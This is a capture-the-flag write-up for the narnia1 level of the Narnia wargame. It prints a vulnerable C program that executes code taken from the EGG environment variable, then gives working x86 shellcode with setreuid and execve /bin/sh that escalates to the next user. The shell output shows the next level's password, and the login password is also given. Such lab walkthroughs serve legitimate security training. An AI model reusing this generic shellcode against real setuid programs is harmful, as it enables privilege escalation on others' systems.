login as `narnia1:WDcYUTG5ul`

```sh
narnia1@gibson:/narnia$ cat narnia1.c
```

```cpp
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

so it reads anything from the EGG variable and jump to it.

probably we can craft assembly and make it call `execve(2)`.

run `compile.sh` in this directory and throw an `EGG`.

```
$ export EGG=`echo -e '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`
$ ./narnia1
Trying to execute EGG!
$ echo i popped a shell
i popped a shell
$ id
uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
```

oh no, we're not getting the required permissions....`execve(2)` does not `setreuid(2)` for us. so we do it ourselves.

```sh
$ export EGG=`echo -e '\xbb\xb3\x37\x01\x01\x81\xeb\x01\x01\x01\x01\xb9\xb3\x37\x01\x01\x81\xe9\x01\x01\x01\x01\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`
$ /narnia/narnia1
Trying to execute EGG!
$ id
uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)
$ cat /etc/narnia_pass/narnia2
5agRAXeBdG
```

